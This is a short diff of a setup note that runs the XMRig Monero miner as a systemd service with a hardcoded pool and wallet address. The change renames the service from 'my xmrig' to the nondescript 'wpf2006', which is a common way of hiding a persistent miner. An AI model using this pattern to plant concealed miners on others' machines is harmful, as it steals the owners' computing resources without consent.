@@ -1,19 +1,12 @@
-####/root/xmrig-6.12.1/auto.sh
+####  xmrig-6.12.1
 
-#!/bin/sh
-/root/xmrig-6.12.1/xmrig -o pool.supportxmr.com:3333 -u 4B753xNybmGRwQ45955F6wDwZ3G8o1mTcTN628WF7LbCb73SuyEuCxVihXLr7ajYYh7Ho4owGDguxW56597in5EaRrHDWzy --cpu-max-threads-hint 74
-
-
-
-
-
-###/etc/systemd/system/myxmrig.service
+###/etc/systemd/system/wpf2006.service
 
 [Unit]
-Description=my xmrig
+Description=wpf2006
 
 [Service]
-ExecStart=/root/xmrig-6.12.1/auto.sh
+ExecStart=/wpf2006/xmrig -o pool.supportxmr.com:3333 -u 4B753xNybmGRwQ45955F6wDwZ3G8o1mTcTN628WF7LbCb73SuyEuCxVihXLr7ajYYh7Ho4owGDguxW56597in5EaRrHDWzy --cpu-max-threads-hint 74
 Restart=on-failure
 
 [Install]
